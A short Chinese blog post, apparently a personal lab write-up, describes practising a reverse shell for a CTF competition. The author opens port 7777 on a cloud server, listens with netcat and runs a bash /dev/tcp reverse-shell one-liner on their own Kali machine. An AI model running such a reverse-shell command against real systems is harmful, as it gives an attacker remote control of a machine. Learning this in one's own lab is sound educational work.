<p>但是还是有大佬把题目做出来了，而且用的技术非常高端反弹shell</p>
<p>今天终于抽出时间来做这个反弹shell的实验</p>
<p>首先我们先自己搭建一个自己的服务器（以后自己做题目也得用）这里我用的阿里云，因为它可以试用</p>
<p>网址<a href="https://developer.aliyun.com/">https://developer.aliyun.com/</a></p>
<p>这里反弹shell的原理之前讲过了，这里就不讲了</p>
<p>搭建好服务器</p>
<p>第一步先设置服务器，这里需要开放一个端口用来反弹shell，我这里用的7777端口<img src="/imgs/1.png"></p>
<p>后续我们也会用这个端口复现下国赛的题目</p>
<p>然后我们用自己的shell来连上我们的服务器</p>
<p>刚连上服务器需要自己下载nc</p>
<p>我们用自己的服务器作为攻击端</p>
<p>用我的kali作为被攻击端</p>
<p>在服务器上</p>
<figure class="highlight livescript"><table><tr><td class="code"><pre><span class="line">nc -lvvp <span class="number">7777</span>//监听<span class="number">7777</span>端口</span><br></pre></td></tr></table></figure>

<p>然后在kali上</p>
<figure class="highlight livescript"><table><tr><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/<span class="number">8.xxx</span>.xxx.xxx/<span class="number">7777</span> <span class="number">0</span>&gt;&amp;<span class="number">1</span></span><br></pre></td></tr></table></figure>

<p>成功连接上</p>
<p><img src="/imgs/2.png"></p>
<p>做这个实验也是花了一些时间</p>
<p>当时没想到服务器要自己去打开端口</p>
<p>没关系成功了就行</p>
]]></content>
      <tags>
        <tag>实验</tag>
      </tags>
  </entry>
</search>
